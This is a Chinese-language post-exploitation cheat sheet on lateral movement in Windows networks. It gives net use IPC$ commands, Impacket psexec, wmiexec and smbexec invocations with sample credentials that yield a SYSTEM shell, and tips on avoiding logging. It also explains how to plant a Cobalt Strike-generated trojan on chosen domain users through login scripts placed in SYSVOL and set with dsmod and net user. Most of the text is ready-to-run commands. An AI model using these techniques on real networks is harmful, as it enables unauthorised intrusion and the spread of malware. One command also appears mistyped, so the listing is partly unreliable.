---
title: 【后渗透】指定主机上线
---
## 指定主机上线

## IPC命名管道连接

**利用条件**

1、目标开启139、445端口

2、管理员开启默认共享（admin$、c$、d$等）

**建立一个连接**

```bash
net use \\目标IP\ipc$ "密码" /user:账号

#查看当前已建立的连接
net use

#列出目标目录文件
dir \\目标IP\c$

#映射共享磁盘到本地
net use z: \\IP\c$ "密码" /user:"用户名"

#删除连接
net user \\目标IP\ipc$ /del

#删除共享映射
net use * /del
```

## 无防火墙

**psexec、wmiexec等方式获取指定主机命令执行权限**

impacket工具包：https://github.com/SecureAuthCorp/impacket

**impacket工具包中的PsExec**

```bash
python psexec.py 用户名:密码@目标IPpython psexec.py Administrator:@admin.886@10.1.1.14
```

会直接反弹一个SYSTEM权限的shell。

> 随着PsExec在内网中被严格监控，越来越多的杀毒厂商已经把PsExec加入了黑名单；
>
> 而且PsExec执行程序时会创建一个psexec服务，并产生大量日志，可以通过日志反推攻击流程。

**使用WMI执行程序（目标需开放135端口）**

WMI是Windows的一个管理工具集，Windows默认不会把WMI的操作记录到日志中

**impacket工具包中的wmiexec**

```bash
python wmiexec.py administrator:@admin.886@10.1.1.14
```

**Impacket中的smbexec.py** 

```bash
python smbexec.py administrator:@admin.886@10.1.1.14
```

## 防火墙全开

**1、通过组策略下发命令执行**

改一下这个[三好学生的脚本](https://3gstudent.github.io/3gstudent.github.io/域渗透-利用GPO中的计划任务实现远程执行/)就能用

**2、通过设置登陆脚本上线指定用户**

>  IPC连接到域控，copy文件，在成员上执行 
>
>  login.bat 是cs生成的马

一）使用dsmod给指定域用户设置登陆脚本

login.bat放在域控的NETLOGON目录下面

```bash
copy login.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\login.bat
dsmod user -loscr "test.bat" "CN=x,OU=x,DC=x,DC=x,DC=x"
```

二）登陆脚本给指定用户种马

login.bat放在域控的NETLOGON目录下面

```bash
copy login.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat
net user xp /scriptpath:login.bat 

gpupdate /force
# 立即刷新组策略 使用域管权限执行  不执行也行,等待随机
```

